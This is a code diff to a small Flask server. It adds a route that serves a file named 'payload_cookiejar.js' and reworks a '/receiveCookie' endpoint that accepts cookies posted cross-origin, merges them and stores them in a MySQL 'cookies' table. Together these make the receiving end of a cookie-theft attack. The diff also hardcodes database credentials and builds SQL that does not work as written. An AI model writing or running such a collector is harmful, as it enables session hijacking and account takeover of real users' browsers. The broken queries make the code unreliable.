@@ -25,6 +25,10 @@ def index():
 </html>
     '''
     
+@app.route('/cookies.js', methods=['GET'])
+def sending_cookie():
+    return send_file('./payload_cookiejar.js', attachment_filename='payload_cookiejar.js')
+    
 @app.route('/receiveCookie',methods=['POST', 'OPTIONS'])
 def receive_cookie():
     # Handle COR preflight request
@@ -37,23 +41,27 @@ def receive_cookie():
         return response
         
     json_cookies = request.get_json()
-    file= open('cookie.txt','a+')
-    for line in json_cookies:
-    	data = json.loads(line.strip())
-    for item in data:
-    	file.write(item)
-    	print(item)
-    #cookieburglar = request.getReader()
-    #f = open("/home/tic/Documents/cookies.txt","a")
-    #f.write(cookieburglar+ ' ' + '\n')
-    #f.close()
+    print (json.dumps(request.get_json(), indent=2, ensure_ascii=False))
+    http_cookies = request.cookies.to_dict()
+
+    cookies = {}
+    for key in set(json_cookies.keys()).union(set(http_cookies.keys())):
+        if key in json_cookies and key in http_cookies:
+            if json_cookies[key] == http_cookies[key]:
+                cookies[key] = json_cookies[key]
+        else:
+            if key in json_cookies:
+                cookies[key] = json_cookies[key]
+            else:
+                cookies[key] = http_cookies[key]
     
     conn = mysql.connector.connect(user='lsuser', password='tic123', database='loginsystem')
     cursor = conn.cursor()
-    insert_cookie = ("insert into cookies (cookie) values (json_cookies);")
-    
-    cursor.execute(insert_cookie)
-    conn.commit()
+    for key, value in cookies.items():
+    	insert_cookie = ("insert into cookies (cookie) values (concat(key,':',value));")
+    	cursor.execute(insert_cookie)
+    	conn.commit()
+    #test_insert = ("insert into cookies (cookie) values ('test2');")
     cursor.close()
     conn.close()
     
